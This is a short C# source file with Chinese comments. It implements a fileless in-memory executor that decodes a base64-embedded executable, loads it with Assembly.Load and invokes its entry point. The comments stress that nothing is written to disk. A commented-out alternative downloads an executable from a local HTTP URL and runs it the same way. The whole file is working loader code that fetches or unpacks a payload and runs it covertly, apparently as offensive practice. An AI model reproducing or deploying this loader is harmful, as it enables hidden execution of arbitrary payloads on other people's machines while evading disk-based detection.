using System;
using System.Net;
using System.Reflection;

namespace CsharpExecutor
{
    public class remote
    {
        public static void MemoryExecutor()
        {
            // 方法1. 把exe文件给base64编码，然后保存在一个常量里, 转成byte数组，放到Assembly.Load函数里
            string base64String = Constants.Base64Exe;
            byte[] buffer = Convert.FromBase64String(base64String);

            // 方法2. 远程下载exe，赋值给一个字符串类型的变量
            // byte[] buffer = GetRemoteByte("http://127.0.0.1:8000/testcalc.exe");
            
            // 这里的Assembly.Load可以读取字符串形式的程序集，也就是说exe文件不需要写入硬盘
            Assembly assembly = Assembly.Load(buffer);
            // 以exe为例，如果是dll文件就必须指定类名函数名
            MethodInfo method = assembly.EntryPoint;
            method.Invoke(null, null);
            // 想要指定参数
            // object[] parameters = new[] {"-a","-b"};
            // method.Invoke(null, parameters);
        }
        
        
        private static byte[] GetRemoteByte(string serviceUrl)
        {
            WebClient client = new WebClient();
            byte[] buffer = client.DownloadData(serviceUrl);
            return buffer;
        }
        
    }
    
}